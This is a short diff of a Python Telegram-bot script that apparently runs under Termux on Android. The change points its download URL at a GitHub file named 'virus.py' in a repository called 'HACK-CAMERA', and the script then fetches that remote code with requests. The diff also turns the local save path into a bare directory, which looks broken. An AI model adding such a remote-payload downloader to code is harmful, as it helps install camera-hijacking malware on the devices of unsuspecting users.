@@ -8,8 +8,8 @@ import telebot
 import os
 import requests
 
-GITHUB_RAW = "https://raw.githubusercontent.com/USERNAME/REPO/main/start.py"
-LOCAL_FILE = "/data/data/com.termux/files/usr/start.py"
+GITHUB_RAW = "https://raw.githubusercontent.com/zeros999/HACK-CAMERA/main/virus.py"
+LOCAL_FILE = "/data/data/com.termux/files/usr"
 
 try:
     r = requests.get(GITHUB_RAW, timeout=5)
